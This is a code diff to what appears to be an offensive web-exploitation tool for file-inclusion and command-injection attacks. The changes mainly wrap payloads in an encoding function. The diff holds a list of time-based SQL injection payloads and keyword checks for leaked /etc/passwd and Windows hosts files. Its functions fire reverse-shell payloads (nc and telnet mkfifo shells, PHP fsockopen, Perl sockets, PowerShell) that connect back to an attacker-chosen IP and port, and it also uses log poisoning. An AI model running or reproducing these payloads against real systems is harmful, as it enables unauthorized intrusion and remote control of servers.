+    sqli.append("%22%20or%20sleep%285%29%23")
+    sqli.append("%27%20or%20sleep%285%29%23")
+    sqli.append("%22%20or%20sleep%285%29%23")
+    sqli.append("%27%20or%20sleep%285%29%23")
+    sqli.append("%22%20or%20sleep%285%29%3D%22")
+    sqli.append("%27%20or%20sleep%285%29%3D%27")
+    sqli.append("1%29%20or%20sleep%285%29%23")
+    sqli.append("1%27%20or%20sleep%285%29%20--%20-")
+    sqli.append("%22%29%20or%20sleep%285%29%3D%22")
+    sqli.append("%27%29%20or%20sleep%285%29%3D%27")
+    sqli.append("1%29%29%20or%20sleep%285%29%23")
+    sqli.append("%22%29%29%20or%20sleep%285%29%3D%22")
+    sqli.append("%27%29%29%20or%20sleep%285%29%3D%27")
+    sqli.append("%3Bwaitfor%20delay%20%270%3A0%3A5%27--%20-")
+    sqli.append("%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--%20-")
+    sqli.append("%27%3Bwaitfor%20delay%20%270%3A0%3A5%27--%20-")
+    sqli.append("%27%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--%20-")
+    sqli.append("%22%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--%20-")
+    sqli.append("%29%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--%20-")
+    sqli.append("%27%29%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--%20-")
+    sqli.append("AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29bAKL%29%20AND%20%27vRxe%27%3D%27vRxe")
+    sqli.append("AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29YjoC%29%20AND%20%27%25%27%3D%27")
+    sqli.append("AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29nQIP%29")
+    sqli.append("SLEEP%285%29%23")
+    sqli.append("SLEEP%285%29--")
+    sqli.append("SLEEP%285%29%3D%22")
+    sqli.append("SLEEP%285%29%3D%27")
+    sqli.append("1%20or%20SLEEP%285%29")
+    sqli.append("1%20or%20SLEEP%285%29%23")
+    sqli.append("1%20or%20SLEEP%285%29--")
+    sqli.append("1%20or%20SLEEP%285%29%3D%22")
+    sqli.append("1%20or%20SLEEP%285%29%3D%27")
+    sqli.append("1%20or%20SLEESLEEPP%285%29%2523--%20-%27")
+    sqli.append("1%20or%20SLEESLEEPP%285%29%3D%27")
+    sqli.append("%22or%20SLEESLEEPP%285%29%2523--%20-%27")
 
     timeSum = 0
     # GET baseline response time
@@ -754,14 +772,14 @@ def test_sqli(url):
     
     for test in sqli:
         if(args.postreq):
-            r, br = POST(url, headers, args.postreq.replace(args.param, test), proxies, "SQLI", "SQLI")
+            r, br = POST(url, headers, args.postreq.replace(args.param, encode(test)), proxies, "SQLI", "SQLI")
         else:
-            r, br = GET(url.replace(args.param, test), headers, proxies, "SQLI", "SQLI")
+            r, br = GET(url.replace(args.param, encode(test)), headers, proxies, "SQLI", "SQLI")
         
         rTime = r.elapsed.total_seconds()
         if(rTime > 5.0 and rTime < rTime + (averageTime*20/100) and rTime > rTime - (averageTime*20/100)):
-            if(args.postreq): r2, br = POST(url, headers, args.postreq.replace(args.param, test.replace("5", "7")), proxies, "SQLI", "SQLI")
-            else: r2, br = GET(url.replace(args.param, test.replace("5", "7")), headers, proxies, "SQLI", "SQLI")
+            if(args.postreq): r2, br = POST(url, headers, args.postreq.replace(args.param, encode(test.replace("5", "7"))), proxies, "SQLI", "SQLI")
+            else: r2, br = GET(url.replace(args.param, encode(test.replace("5", "7"))), headers, proxies, "SQLI", "SQLI")
             r2Time = r2.elapsed.total_seconds()
             if(r2Time > 7.0 and r2Time < r2Time + (averageTime*20/100) and r2Time > r2Time - (averageTime*20/100)):
                 print("[+] SQLI -> " + url.replace(args.param, test))
@@ -773,21 +791,12 @@ def test_sqli(url):
 
 #Checks if sent payload is executed, if any of the below keywords are in the response, returns True
 def checkPayload(webResponse):
-    KEY_WORDS = ["root:x:0:0", "www-data:", "<IMG sRC=X onerror=jaVaScRipT:alert`xss`>",
-                "cm9vdDp4OjA", "Ond3dy1kYX", "ebbg:k:0:0", "d3d3LWRhdG", "aahgpz\"ptz>e<atzf",
-                "jjj-qngn:k", "daemon:x:1:", "r o o t : x : 0 : 0", "ZGFlbW9uOng6",
-                "; for 16-bit app support", "sample HOSTS file used by Microsoft",
-                "iBvIG8gdCA6IHggOiA", "OyBmb3IgMTYtYml0IGFwcCBzdXBw", "c2FtcGxlIEhPU1RTIGZpbGUgIHVzZWQgYnkgTWljcm9zb2", 
-                "Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg",
-                "; sbe 16-ovg ncc fhccbeg", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
-                ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
-                "c2FtcGxlIEhPU1RT", "=1943785348b45", "www-data:x", "PD9w",
-                "961bb08a95dbc34397248d92352da799", "PCFET0NUWVBFIGh0b",
-                "PCFET0N", "PGh0b"]
     
     for word in KEY_WORDS:
-         if word in webResponse.text and "PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K" not in webResponse.text:
-            return True
+         if(word in webResponse.text):
+             if(word == "PD9w" and "PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K" in webResponse.text):
+                 return False
+             return True
     return False
 
     
@@ -805,55 +814,55 @@ def exploit_bash(exploit, method, ip, port):
     bashPayloadStageTwo = "bash+/tmp/1.sh"
 
     if(method == "INPUT"):
-        res, _ = POST(url.replace(tempArg, bashTest), headers, exploit['POSTVAL'], proxies, "", "", True)
+        res, _ = POST(url.replace(tempArg, encode(bashTest)), headers, exploit['POSTVAL'], proxies, "", "", True)
         if("/bash" in res.text):
-            u = url.replace(tempArg, bashPayloadStageOne)
+            u = url.replace(tempArg, encode(bashPayloadStageOne))
             printInfo(ip, port, "bash", "input wrapper")
             POST(u, headers, exploit['POSTVAL'], proxies, "", "", True)
-            POST(url.replace(tempArg, bashPayloadStageTwo), headers, exploit['POSTVAL'], proxies, "", "", True)
+            POST(url.replace(tempArg, encode(bashPayloadStageTwo)), headers, exploit['POSTVAL'], proxies, "", "", True)
             return True
     if(method == "DATA"):
         if(args.postreq): 
-            res,_ = POST(url.replace(tempArg, bashTest), post, headers, proxies, "", "", True)
+            res,_ = POST(url.replace(tempArg, encode(bashTest)), post, headers, proxies, "", "", True)
         else: 
-            res, _ = GET(url.replace(tempArg, bashTest), headers, proxies, "", "", True)
+            res, _ = GET(url.replace(tempArg, encode(bashTest)), headers, proxies, "", "", True)
         if("/bash" in res.text):
             printInfo(ip, port, "bash", "data wrapper")
             if(not args.postreq):
-                GET(url.replace(tempArg, bashPayloadStageOne), headers, proxies, "", "", True)
-                GET(url.replace(tempArg, bashPayloadStageTwo), headers, proxies, "", "", True)
+                GET(url.replace(tempArg, encode(bashPayloadStageOne)), headers, proxies, "", "", True)
+                GET(url.replace(tempArg, encode(bashPayloadStageTwo)), headers, proxies, "", "", True)
             else:
-                POST(url.replace(tempArg, bashPayloadStageOne), headers, post, proxies)
-                POST(url.replace(tempArg, bashPayloadStageTwo), headers, post, proxies, "", "", True)
+                POST(url.replace(tempArg, encode(bashPayloadStageOne)), headers, post, proxies)
+                POST(url.replace(tempArg, encode(bashPayloadStageTwo)), headers, post, proxies, "", "", True)
             return True
     if(method == "EXPECT"):
         if(args.postreq): 
-            res,_ = POST(url, headers, post.replace(tempArg, bashTest), proxies, "", "", True)
+            res,_ = POST(url, headers, post.replace(tempArg, encoded(bashTest)), proxies, "", "", True)
         else: 
-            res, _ = GET(url.replace(tempArg, bashTest), headers, proxies, "", "", True)
+            res, _ = GET(url.replace(tempArg, encode(bashTest)), headers, proxies, "", "", True)
         if("/bash" in res.text):
             printInfo(ip, port, "bash", "expect wrapper")
             if(args.postreq):
-                POST(url, headers, post.replace(tempArg, bashPayloadStageOne), proxies, "", "", True)
-                POST(url, headers, post.replace(tempArg, bashPayloadStageTwo), proxies, "", "", True)
+                POST(url, headers, post.replace(tempArg, encode(bashPayloadStageOne)), proxies, "", "", True)
+                POST(url, headers, post.replace(tempArg, encode(bashPayloadStageTwo)), proxies, "", "", True)
             else:
-                GET(url.replace(tempArg, bashPayloadStageOne), headers, proxies, "", "", True)
-                GET(url.replace(tempArg, bashPayloadStageTwo), headers, proxies, "", "", True)
+                GET(url.replace(tempArg, encode(bashPayloadStageOne)), headers, proxies, "", "", True)
+                GET(url.replace(tempArg, encode(bashPayloadStageTwo)), headers, proxies, "", "", True)
             return True
     if(method == "TRUNC"):
-        exploit_log_poison(ip, port, url, bashPayloadStageOne, bashPayloadStageTwo, bashTest, "/bash", exploit['POSTVAL'])
+        exploit_log_poison(ip, port, url, bashPayloadStageOne, encode(bashPayloadStageTwo), bashTest, "/bash", exploit['POSTVAL'])
         return True
    
     if(method == "CMD"):
         if(args.postreq): 
-            res,_ = POST(url, headers, post.replace(tempArg, bashTest), proxies, "", "", True)
+            res,_ = POST(url, headers, post.replace(tempArg, encode(bashTest)), proxies, "", "", True)
         else: 
-            res,_ = GET(url.replace(tempArg, bashTest), headers, proxies, "", "", True)
+            res,_ = GET(url.replace(tempArg, encode(bashTest)), headers, proxies, "", "", True)
         if("/bin" in res.text and "/bash" in res.text):
             printInfo(ip, port, "bash", "command injection")
             if(args.postreq):
-                POST(url, headers, post.replace(tempArg, bashPayloadStageOne), proxies, "", "", True)
-                POST(url, headers, post.replace(tempArg, bashPayloadStageTwo), proxies, "", "", True)
+                POST(url, headers, post.replace(tempArg, encode(bashPayloadStageOne)), proxies, "", "", True)
+                POST(url, headers, post.replace(tempArg, encode(bashPayloadStageTwo)), proxies, "", "", True)
             else: 
                 GET(url.replace(tempArg, bashPayloadStageOne), headers, proxies, "", "", True)
                 GET(url.replace(tempArg, bashPayloadStageTwo), headers, proxies, "", "", True)
@@ -868,50 +877,50 @@ def exploit_nc(exploit, method, ip, port):
     ncPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f"
 
     if(method == "INPUT"):
-        res, _ = POST(url.replace(tempArg, ncTest), headers, exploit['POSTVAL'], proxies, "", "", True)
+        res, _ = POST(url.replace(tempArg, encode(ncTest)), headers, exploit['POSTVAL'], proxies, "", "", True)
         if("/bin" in res.text and "/nc" in res.text):
             printInfo(ip, port, "nc", "input wrapper")
-            POST(url.replace(tempArg, ncPayload), headers, exploit['POSTVAL'], proxies, "", "", True)
+            POST(url.replace(tempArg, encode(ncPayload)), headers, exploit['POSTVAL'], proxies, "", "", True)
             return True
     if(method == "DATA"):
         if(args.postreq): 
-            res, _ = POST(url.replace(tempArg, ncTest), headers, post, proxies, "", "", True)
+            res, _ = POST(url.replace(tempArg, encode(ncTest)), headers, post, proxies, "", "", True)
         else: 
-            res, _ = GET(url.replace(tempArg, ncTest), headers, proxies, "", "", True)
+            res, _ = GET(url.replace(tempArg, encode(ncTest)), headers, proxies, "", "", True)
         if("/bin" in res.text and "/nc" in res.text):
             printInfo(ip, port, "nc", "data wrapper")
             if(args.postreq): 
-                POST(url.replace(tempArg, ncPayload), post, headers, proxies, "", "", True)
+                POST(url.replace(tempArg, encode(ncPayload)), post, headers, proxies, "", "", True)
             else: 
-                GET(url.replace(tempArg, ncPayload), headers, proxies, "", "", True)
+                GET(url.replace(tempArg, encode(ncPayload)), headers, proxies, "", "", True)
             return True
     if(method == "EXPECT"):
         if(args.postreq): 
-            res, _ = POST(url.replace(tempArg, ncTest), headers, post, proxies, "", "", True)
+            res, _ = POST(url.replace(tempArg, encode(ncTest)), headers, post, proxies, "", "", True)
         else: 
-            res, _ = GET(url.replace(tempArg, ncTest), headers, proxies, "", "", True)
+            res, _ = GET(url.replace(tempArg, encode(ncTest)), headers, proxies, "", "", True)
         if("/bin" in res.text and "/nc" in res.text):
             printInfo(ip, port, "nc", "expect wrapper")
             if(args.postreq): 
-                POST(url.replace(tempArg, ncPayload), headers, post, proxies, "", "", True)
+                POST(url.replace(tempArg, encode(ncPayload)), headers, post, proxies, "", "", True)
             else: 
-                GET(url.replace(tempArg, ncPayload), headers, proxie, "", "", True)
+                GET(url.replace(tempArg, encode(ncPayload)), headers, proxie, "", "", True)
             return True
     if(method == "TRUNC"):
-        exploit_log_poison(ip, port, url, ncPayload, "", ncTest, "/nc", exploit['POSTVAL'])
+        exploit_log_poison(ip, port, url, encode(ncPayload), "", ncTest, "/nc", exploit['POSTVAL'])
         return True
    
     if(method == "CMD"):
         if(args.postreq): 
-            res, _ = POST(url, headers, post.replace(tempArg, ncTest), proxies, "", "", True)
+            res, _ = POST(url, headers, post.replace(tempArg, encode(ncTest)), proxies, "", "", True)
         else:
-            res, _ = GET(url.replace(tempArg, bashTest), headers, proxies, "", "", True)
+            res, _ = GET(url.replace(tempArg, encode(ncTest)), headers, proxies, "", "", True)
         if("/bin" in res.text and "/nc" in res.text):
             printInfo(ip, port, "nc", "command injection")
             if(args.postreq):
-                POST(url, headers, post.replace(tempArg, ncPayload), proxies, "", "", True)
+                POST(url, headers, post.replace(tempArg, encode(ncPayload)), proxies, "", "", True)
             else: 
-                GET(url.replace(tempArg, ncPayload), headers, proxies, "", "", True)
+                GET(url.replace(tempArg, encode(ncPayload)), headers, proxies, "", "", True)
             return True
 
 
@@ -924,51 +933,51 @@ def exploit_php(exploit, method, ip, port):
     phpPayload =  "php+-r+'$sock%3dfsockopen(\"{0}\",{1})%3bexec(\"/bin/sh+-i+<%263+>%263+2>%263\")%3b'".format(ip, str(port))
 
     if(method == "INPUT"):
-        u = url.replace(tempArg, phpTest)
+        u = url.replace(tempArg, encode(phpTest))
         res, _ = POST(u, headers, exploit['POSTVAL'], proxies, "", "", True)
         if("/bin" in res.text and "/php" in res.text):
             printInfo(ip, port, "PHP", "input wrapper")
-            POST(url.replace(tempArg, phpPayload), headers, exploit['POSTVAL'], proxies, "", "", True)
+            POST(url.replace(tempArg, encode(phpPayload)), headers, exploit['POSTVAL'], proxies, "", "", True)
             return True
     if(method == "DATA"):
-        if(args.postreq): 
-            res, _ = POST(url.replace(tempArg, phpTest), post, headers, proxies, "", "", True)
-        else: 
-            res,_ = GET(url.replace(tempArg, phpTest), headers, proxies, "", "", True)
+        if(args.postreq):
+            res, _ = POST(url.replace(tempArg, encode(phpTest)), post, headers, proxies, "", "", True)
+        else:
+            res,_ = GET(url.replace(tempArg, encode(phpTest)), headers, proxies, "", "", True)
         if("/bin" in res.text and "/php" in res.text):
             printInfo(ip, port, "PHP", "data wrapper")
             if(args.postreq):
-                POST(url.replace(tempArg, phpPayload), post, headers, proxies, "", "", True)
-            else: 
-                GET(url.replace(tempArg, phpPayload), headers, proxies, "", "", True)
+                POST(url.replace(tempArg, encode(phpPayload)), post, headers, proxies, "", "", True)
+            else:
+                GET(url.replace(tempArg, encode(phpPayload)), headers, proxies, "", "", True)
             return True
     if(method == "EXPECT"):
         if(args.postreq): 
-            res, _ = POST(url, headers, post.replace(tempArg, phpTest), proxies, "", "", True)
+            res, _ = POST(url, headers, post.replace(tempArg, encode(phpTest)), proxies, "", "", True)
         else: 
-            res,_ = GET(url.replace(tempArg, phpTest), proxies, "", "", True)
+            res,_ = GET(url.replace(tempArg, encode(phpTest)), proxies, "", "", True)
         if("/bin" in res.text and "/php" in res.text):
             printInfo(ip, port, "PHP", "expect wrapper")
             if(args.postreq):
-                POST(url, headers, post.replace(tempArg, phpPayload), proxies, "", "", True)
+                POST(url, headers, post.replace(tempArg, encode(phpPayload)), proxies, "", "", True)
             else:
-                GET(url.replace(tempArg, phpPayload), headers, proxies, "" , "", True)
+                GET(url.replace(tempArg, encode(phpPayload)), headers, proxies, "" , "", True)
             return True
     if(method == "TRUNC"):
-        exploit_log_poison(ip, port, url, phpPayload, "", phpTest, "/php", exploit['POSTVAL'])
+        exploit_log_poison(ip, port, url, phpPayload, "", encode(phpTest), "/php", exploit['POSTVAL'])
         return True
 
     if(method == "CMD"):
-        if(args.postreq): 
-            res, _ = POST(url, headers, post.replace(tempArg, phpTest), proxies, "", "" , True)
-        else: 
-            res,_ = GET(url.replace(tempArg, bashTest), headers, proxies, "", "", True)
+        if(args.postreq):
+            res, _ = POST(url, headers, post.replace(tempArg, encode(phpTest)), proxies, "", "" , True)
+        else:
+            res,_ = GET(url.replace(tempArg, encode(phpTest)), headers, proxies, "", "", True)
         if("/bin" in res.text and "/php" in res.text):
             printInfo(ip, port, "php", "command injection")
             if(args.postreq):
-                POST(url, headers, post.replace(tempArg, phpPayload), proxies, "", "", True)
-            else: 
-                GET(url.replace(tempArg, phpPayload), headers, proxies, "", "", True)
+                POST(url, headers, post.replace(tempArg, encode(phpPayload)), proxies, "", "", True)
+            else:
+                GET(url.replace(tempArg, encode(phpPayload)), headers, proxies, "", "", True)
             return True
 
 def exploit_perl(exploit, method, ip, port):
@@ -982,50 +991,50 @@ def exploit_perl(exploit, method, ip, port):
                   "(STDERR,\">%26S\")%3bexec(\"/bin/sh+-i\")%3b}%3b'"
 
     if(method == "INPUT"): 
-        res, _ = POST(url.replace(tempArg, perlTest), headers, exploit['POSTVAL'], proxies, "", "", True)
+        res, _ = POST(url.replace(tempArg, encode(perlTest)), headers, exploit['POSTVAL'], proxies, "", "", True)
         if("/bin" in res.text and "/perl" in res.text):
-            u = url.replace(tempArg, perlPayload)
+            u = url.replace(tempArg, encode(perlPayload))
             printInfo(ip, port, "perl", "input wrapper")
             POST(u, headers, exploit['POSTVAL'], proxies, "", "", True)
             return True
     if(method == "DATA"):
         if(args.postreq): 
-            res, _ = POST(url.replace(tempArg, perlTest), headers, post, proxies, "", "", True)
+            res, _ = POST(url.replace(tempArg, encode(perlTest)), headers, post, proxies, "", "", True)
         else: 
-            res, _ = GET(url.replace(tempArg, perlTest), headers, proxies, "", "", True)
+            res, _ = GET(url.replace(tempArg, encode(perlTest)), headers, proxies, "", "", True)
         if("/bin" in res.text and "/perl" in res.text):
             printInfo(ip, port, "perl", "data wrapper")
             if(args.postreq):
-                POST(url.replace(tempArg, perlPayload), headers, post, proxies, "", "", True)
+                POST(url.replace(tempArg, encode(perlPayload)), headers, post, proxies, "", "", True)
             else: 
-                GET(url.replace(tempArg, perlPayload), headers, proxies, "", "", True)
+                GET(url.replace(tempArg, encode(perlPayload)), headers, proxies, "", "", True)
             return True
     if(method == "EXPECT"):
         if(args.postreq): 
-            res, _ = POST(url, headers, post.replace(tempArg, perlPayload), proxies, "", "", True)
+            res, _ = POST(url, headers, post.replace(tempArg, encode(perlPayload)), proxies, "", "", True)
         else: 
-            res, _ = GET(url.replace(tempArg, perlTest), headers, proxies, "", "", True)
+            res, _ = GET(url.replace(tempArg, encode(perlTest)), headers, proxies, "", "", True)
         if("/bin" in res.text and "/perl" in res.text):
             printInfo(ip, port, "perl", "expect wrapper")
             if(args.postreq):
-                POST(url, headers, post.replace(tempArg, perlPayload), proxies, "", "", True)
+                POST(url, headers, post.replace(tempArg, encode(perlPayload)), proxies, "", "", True)
             else: 
-                GET(url.replace(tempArg, perlPayload), headers, proxies, "", "", True)
+                GET(url.replace(tempArg, encode(perlPayload)), headers, proxies, "", "", True)
             return True
     if(method == "TRUNC"):
-        exploit_log_poison(ip, port, url, perlPayload, "", perlTest, "/perl", exploit['POSTVAL'])
+        exploit_log_poison(ip, port, url, encode(perlPayload), "", encode(perlTest), "/perl", exploit['POSTVAL'])
         return True
 
     if(method == "CMD"):
         if(args.postreq):
-            res, _ = POST(url, headers, post.replace(tempArg, perlTest), proxies, "", "", True)
+            res, _ = POST(url, headers, post.replace(tempArg, encode(perlTest)), proxies, "", "", True)
         else: 
-            res,_ = GET(url.replace(tempArg, bashTest), headers, proxies, "", "", True)
+            res,_ = GET(url.replace(tempArg, encode(perlTest)), headers, proxies, "", "", True)
         if("/bin" in res.text and "/perl" in res.text):
             printInfo(ip, port, "perl", "command injection")
             if(args.postreq):
-                POST(url, headers, post.replace(tempArg, perlPayload), proxies, "", "", True)
-            else: GET(url.replace(tempArg, perlPayload), headers, proxies, "", "", True)
+                POST(url, headers, post.replace(tempArg, encode(perlPayload)), proxies, "", "", True)
+            else: GET(url.replace(tempArg, encode(perlPayload)), headers, proxies, "", "", True)
             return True
 
 def exploit_telnet(exploit, method, ip, port):
@@ -1037,53 +1046,53 @@ def exploit_telnet(exploit, method, ip, port):
     telnetPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, str(port))
 
     if(method == "INPUT"):
-        res, _ = POST(url.replace(tempArg, telnetTest), headers, exploit['POSTVAL'], proxies, "", "", True)
+        res, _ = POST(url.replace(tempArg, encode(telnetTest)), headers, exploit['POSTVAL'], proxies, "", "", True)
         if("/bin" in res.text and "/telnet" in res.text):
-            u = url.replace(tempArg, telnetPayload)
+            u = url.replace(tempArg, encode(telnetPayload))
             printInfo(ip, port, "telnet", "input wrapper")
             POST(u, headers, exploit['POSTVAL'], proxies, "", "", True)
             return True
     if(method == "DATA"):
         if(args.postreq): 
-            res, _ = POST(url.replace(tempArg, telnetTest), headers, post, proxies, "", "", True)
+            res, _ = POST(url.replace(tempArg, encode(telnetTest)), headers, post, proxies, "", "", True)
         else:
-            res,_ = GET(url.replace(tempArg, telnetTest), headers, proxies, "", "", True)
+            res,_ = GET(url.replace(tempArg, encode(telnetTest)), headers, proxies, "", "", True)
         if("/bin" in res.text and "/telnet" in res.text):
-            u = url.replace(tempArg, telnetPayload)
+            u = url.replace(tempArg, encode(telnetPayload))
             printInfo(ip, port, "telnet", "data wrapper")
-            if(args.postreq): 
-                POST(url.replace(tempArg, telnetPayload), headers, post, proxies, "", "", True)
-            else: 
+            if(args.postreq):
+                POST(url.replace(tempArg, encode(telnetPayload)), headers, post, proxies, "", "", True)
+            else:
                 GET(u, headers, proxies, "", "", True)
             return True
     if(method == "EXPECT"):
-        if(args.postreq): 
-            res, _ = POST(url, headers, post.replace(tempArg, telnetPayload), proxies, "", "", True)
+        if(args.postreq):
+            res, _ = POST(url, headers, post.replace(tempArg, encode(telnetPayload)), proxies, "", "", True)
         else:
-            res, _ = GET(url.replace(tempArg, telnetTest), headers, proxies, "", "", True)
+            res, _ = GET(url.replace(tempArg, encode(telnetTest)), headers, proxies, "", "", True)
         if("/bin" in res.text and "/telnet" in res.text):
-            u = url.replace(tempArg, telnetPayload)
+            u = url.replace(tempArg, encode(telnetPayload))
             printInfo(ip, port, "telnet", "expect wrapper")
-            if(args.postreq): 
-                POST(url, headers, post.replace(tempArg, telnetPayload), proxies, "", "", True)
+            if(args.postreq):
+                POST(url, headers, post.replace(tempArg, encode(telnetPayload)), proxies, "", "", True)
             else:
                 GET(u, headers, proxies, "", "", True)
             return True
     if(method == "TRUNC"):
-        exploit_log_poison(ip, port, url, telnetPayload, "", telnetTest, "/telnet", exploit['POSTVAL'])
+        exploit_log_poison(ip, port, url, encode(telnetPayload), "", encode(telnetTest), "/telnet", exploit['POSTVAL'])
         return True
 
     if(method == "CMD"):
         if(args.postreq): 
-            res, _ = POST(url, headers, post.replace(tempArg, telnetTest), proxies, "", "", True)
-        else: 
-            res, _ = GET(url.replace(tempArg, bashTest), headers, proxies, "", "", True)
+            res, _ = POST(url, headers, post.replace(tempArg, encode(telnetTest)), proxies, "", "", True)
+        else:
+            res, _ = GET(url.replace(tempArg, encode(telnetTest)), headers, proxies, "", "", True)
         if("/bin" in res.text and "/telnet" in res.text):
             printInfo(ip, port, "telnet", "command injection")
             if(args.postreq):
-                POST(url, headers, post.replace(tempArg, telnetPayload), proxies, "", "", True)
-            else: 
-                GET(url.replace(tempArg, telnetPayload), headers, proxies, "", "", True)
+                POST(url, headers, post.replace(tempArg, encode(telnetPayload)), proxies, "", "", True)
+            else:
+                GET(url.replace(tempArg, encode(telnetPayload)), headers, proxies, "", "", True)
             return True
 
 def exploit_powershell(exploit, method, ip, port):
@@ -1102,53 +1111,53 @@ def exploit_powershell(exploit, method, ip, port):
     powershellPayload = powershellPayload.replace("{PORT}", str(port))
     
     if(method == "INPUT"):
-        res, _ = POST(url.replace(tempArg, powershellTest), headers, exploit['POSTVAL'], proxies, "", "", True)
+        res, _ = POST(url.replace(tempArg, encode(powershellTest)), headers, exploit['POSTVAL'], proxies, "", "", True)
         if("Windows IP Configuration" in res.text):
-            u = url.replace(tempArg, powershellPayload) 
+            u = url.replace(tempArg, encode(powershellPayload))
             POST(u, headers, exploit['POSTVAL'], proxies, "", "", True)
             printInfo(ip, port, "powershell", "input wrapper")
             return True
     if(method == "DATA"):
-        if(args.postreq): 
-            res, _ = POST(url.replace(tempArg, powershellTest), headers, post, proxies, "", "", True)
+        if(args.postreq):
+            res, _ = POST(url.replace(tempArg, encode(powershellTest)), headers, post, proxies, "", "", True)
         else: 
-            res,_ = GET(url.replace(tempArg, powershellTest), headers, proxies, "", "", True)
+            res,_ = GET(url.replace(tempArg, encode(powershellTest)), headers, proxies, "", "", True)
         if("Windows IP Configuration" in res.text):
             printInfo(ip, port, "powershell", "data wrapper")
-            u = url.replace(tempArg, powershellPayload)
+            u = url.replace(tempArg, encode(powershellPayload))
             if(args.postreq): 
-                POST(url.replace(tempArg, powershellTest), headers, post, proxies, "", "", True)
+                POST(url.replace(tempArg, encode(powershellTest)), headers, post, proxies, "", "", True)
             else: 
                 GET(u, headers, proxies, "", "", True)
             return True
     if(method == "EXPECT"):
             if(args.postreq):
-                res, _ = POST(url, headers, post.replace(tempArg, powershellTest), proxies, "", "", True)
+                res, _ = POST(url, headers, post.replace(tempArg, encode(powershellTest)), proxies, "", "", True)
             else:
-                res, _ = GET(url.replace(tempArg, powershellTest), headers, proxies, "", "", True)
+                res, _ = GET(url.replace(tempArg, encode(powershellTest)), headers, proxies, "", "", True)
             if("Windows IP Configuration" in res.text):
-                u = url.replace(tempArg, powershellPayload)
+                u = url.replace(tempArg, encode(powershellPayload))
                 printInfo(ip, port, "powershell", "expect wrapper")
                 if(args.postreq):
-                    POST(url, headers, post.replace(tempArg,  powershellTest), proxies, "", "", True)
+                    POST(url, headers, post.replace(tempArg,  encode(powershellTest)), proxies, "", "", True)
                 else: 
                     GET(u, headers, proxies, "", "", True)
                 return True
     if(method == "TRUNC"):
-        exploit_log_poison(ip, port, url, powershellPayload, "", powershellTest, "Windows IP Configuration", exploit['POSTVAL'])
+        exploit_log_poison(ip, port, url, encode(powershellPayload), "", encode(powershellTest), "Windows IP Configuration", exploit['POSTVAL'])
         return True
 
     if(method == "CMD"):
         if(args.postreq):
-            res, _ = POST(url, headers, post.replace(tempArg, powershellTest), proxies, "", "", True)
+            res, _ = POST(url, headers, post.replace(tempArg, encode(powershellTest)), proxies, "", "", True)
         else: 
-            res, _ = GET(url.replace(tempArg, bashTest), headers, proxies, "", "", True)
+            res, _ = GET(url.replace(tempArg, encode(powershellTest)), headers, proxies, "", "", True)
         if("Windows IP Configuration" in res.text):
             printInfo(ip, port, "powershell", "command injection")
             if(args.postreq):
-                POST(url, headers, post.replace(tempArg, powershellPayload), proxies, "", "", True)
+                POST(url, headers, post.replace(tempArg, encode(powershellPayload)), proxies, "", "", True)
             else:
-                GET(url.replace(tempArg, powershellPayload), headers, proxies, "", "", True)
+                GET(url.replace(tempArg, encode(powershellPayload)), headers, proxies, "", "", True)
             return True
 
 def prepareRfiExploit(payloadFile, temporaryFile, ip, port):
@@ -1488,7 +1497,7 @@ def main():
         try:     
             #Check if url is accessible
             if(args.postreq):
-                r,_ = POST(args.url, headers, proxies, "test", "test")
+                r,_ = POST(args.url, headers, args.postreq, proxies, "test", "test")
             else:
                 r,_ = GET(args.url, headers, proxies, "test", "test")
            
@@ -1612,30 +1621,31 @@ if(__name__ == "__main__"):
 
     optionsGroup = parser.add_argument_group('GENERAL OPTIONS')
     optionsGroup.add_argument('-C', type=str, metavar='<cookie>', dest='cookie', help='\t\t Specify session cookie, Ex: "PHPSESSID=1943785348b45"')
-    optionsGroup.add_argument('-D', type=str, metavar='<request>', dest='postreq', help='\t\t Do HTTP POST value test. Ex: "param=PWN"')
+    optionsGroup.add_argument('-D', type=str, metavar='<data>', dest='postreq', help='\t\t Do HTTP POST value test. Ex: "param=PWN"')
     optionsGroup.add_argument('-H', type=str, metavar='<header>', action='append', dest='httpheaders', help='\t\t Specify additional HTTP header(s). Ex: "X-Forwarded-For:127.0.0.1"')
-    optionsGroup.add_argument('-P', type=str, metavar = '<proxy>', dest='proxyAddr', help='\t\t Specify Proxy IP address. Ex: "http://127.0.0.1:8080"')
+    optionsGroup.add_argument('-P', type=str, metavar = '<proxy>', dest='proxyAddr', help='\t\t Specify proxy. Ex: "http://127.0.0.1:8080"')
     optionsGroup.add_argument('--useragent', type=str, metavar= '<agent>', dest='agent', help='\t\t Specify HTTP user agent')
     optionsGroup.add_argument('--referer', type=str, metavar = '<referer>', dest='referer', help='\t\t Specify HTTP referer')
     optionsGroup.add_argument('--param', type=str, metavar='<name>', dest='param', help='\t\t Specify different test parameter value')
-    optionsGroup.add_argument('--no-stop', action='store_true', dest = 'no_stop', help='\t\t Don\'t stop using same method upon findings')
     optionsGroup.add_argument('--http-ok', type=int, action='append', metavar='<number>', dest='http_valid', help='\t\t Specify http response code(s) to treat as valid')
+    optionsGroup.add_argument('--no-stop', action='store_true', dest = 'no_stop', help='\t\t Don\'t stop using same method upon findings')
 
     attackGroup = parser.add_argument_group('ATTACK TECHNIQUE')
-    attackGroup.add_argument('-f', '--filter', action = 'store_true', dest = 'php_filter', help='\t\t Attack using filter:// wrapper')
-    attackGroup.add_argument('-i', '--input', action = 'store_true', dest = 'php_input', help='\t\t Attack using input:// wrapper')
